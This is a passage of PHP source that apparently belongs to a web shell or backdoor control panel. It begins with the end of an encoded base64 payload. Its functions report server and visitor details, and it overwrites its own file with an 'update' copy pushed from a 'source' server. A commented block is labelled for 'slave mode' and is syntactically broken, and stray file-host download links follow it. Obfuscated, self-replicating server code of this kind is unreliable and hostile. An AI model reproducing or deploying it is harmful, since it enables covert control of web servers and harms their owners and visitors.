'XkU92AvCTxloCpJkVdZalf2dYmr13FcHQkcAWa7c9al/mY5JDu8yeYnotkaQ7my3QRuIuMJkusjK0r62KCmI8uR9df0ENZWop'.
'+DK2RVRpNpLR/Xn+1iFGlr24nNIU5iMuAegcS1xl26jzEHGQxyStnnNA7d+7x6T1WTm4wtrut907f7sDvqiuWvFeserA7daS1'.
'dwbrmUPaJH9b/AdePVH0MvMOm9SlIFyAVbEIYSgwYli5wbbrtR4hRMs5JvhXu358M8D2rrPmq45ARD8tiKroqIoOg2jTtIwa1'.
'dcZewlPTfonDiKfYm0A/34Svpa4GqQCR5Bpoh6CNyWEFDa7Cw+0KNCrvw==')));}
function _sys(){return __static("System Statistics ",
h4( 'Stream: '.bytesize(filesize(__FILE__))).h4('Lines:
'.number_format(lines())).h4('Runtime:
'.round(runtime(),6).'Milliseconds').h4($_SERVER['REMOTE_ADDR'].'=&gt;'.$_SERVER['HTTP_HOST'],'
style="font-family:monospace;"'.get_isp()), "System" ) ; }
function is_source(){ return (md5(__SRVIP__)==md5(__SRCIP__))?true:FALSE; }
function update(){
if(freeze())file_put_contents(__UPDATE__,file_get_contents(__FREEZE__));
if(!file_exists(__UPDATE__))file_put_contents(__UPDATE__,file_get_contents(__FREEZE__));
elseif(md5(__FREEZE__)!=md5(__UPDATE__))file_put_contents(__UPDATE__,file_get_contents(__FREEZE__));
if(!is_source())file_put_contents(__FILE__,file_get_contents(__UPDATE__));}
function freeze(){
$current=author_stable();
if(md5(__UPDATE__)!=md5($current)){
       file_put_contents(__FREEZE__,$current);
}else return FALSE;}

function author_stable(){return
!is_source()?file_get_contents(__FILE__):update();}
       /* AUTO CLIENT UPDATE
        * UNCOMMENT DURING SLAVE MODE
       if(!empty($_SERVER['REQUEST_URI'])&&!is_source()){
               if($_SERVER['REQUEST_URI'] === '/')$u=md5(__FILE__)===md5(__UPDATE__)
                       ? if(md5(__FILE__)!=md5(__UPDATE__)) update();
       }


//Download: http://oron.com/kd3ckx2fp6p0/Rose_from_nowhere.part1.rar.html
http://oron.com/qf7895p9k60y/Rose_from_nowhere.part2.rar.html

       /* ** */
function printr($str=NULL){return(_screen(print_r((is_array($str)?$str:$_SESSION),TRUE)));}
function lines(){return count(file(__FILE__, FILE_IGNORE_NEW_LINES |
FILE_SKIP_EMPTY_LINES))+1;}
function runtime(){return floatval(microtime(true))-__START_CLOCK__;}
